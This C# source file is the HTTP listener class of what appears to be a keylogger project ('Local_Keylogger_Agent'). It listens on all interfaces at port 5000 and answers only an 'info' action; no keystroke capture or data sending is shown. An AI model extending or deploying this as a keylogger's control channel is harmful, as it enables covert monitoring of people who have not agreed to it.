using System.Net;
using System.Text;

namespace Local_Keylogger_Agent
{
    internal class HTTPServer
    {
        private HttpListener httpListener;
        public static uint HTTPort = 5000; // Port for the HTTP server

        public void StartHTTPServer()
        {
            httpListener = new HttpListener();
            httpListener.Prefixes.Add($"http://+:{HTTPort}/"); // Set the prefix for the HTTP server
            httpListener.Start();

            Task.Run(async () =>
            {
                while (httpListener.IsListening)
                {
                    try
                    {
                        HttpListenerContext context = await httpListener.GetContextAsync();
                        _ = Task.Run(() => HandleRequest(context));
                    }
                    catch (HttpListenerException ex)
                    {
                        break; // Exit the loop if the listener is stopped
                    }
                }
            });
        }
        private void HandleRequest(HttpListenerContext context)
        {
            // Handle the incoming request here
            HttpListenerRequest request = context.Request;
            HttpListenerResponse response = context.Response;

            string action = request.QueryString["action"] ?? string.Empty;

            switch(action.ToLower())
            {
                case "info":
                    WriteResponse(response, "Local Keylogger Agent is running.");
                    break;

                default:
                    WriteResponse(response, $"Unknown Command: {action} : Enter \"Help\" to list available commands...");
                    break;
            }

            response.OutputStream.Close();
        }



        public static void WriteResponse(HttpListenerResponse response, string text)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(text);
            response.ContentType = "text/plain; charset=utf-8";  // MIME‑тип
            response.ContentLength64 = buffer.Length;              // длина тела
            response.StatusCode = (int)HttpStatusCode.OK;       // код 200
            response.OutputStream.Write(buffer, 0, buffer.Length); // запись в поток
        }
    }
}
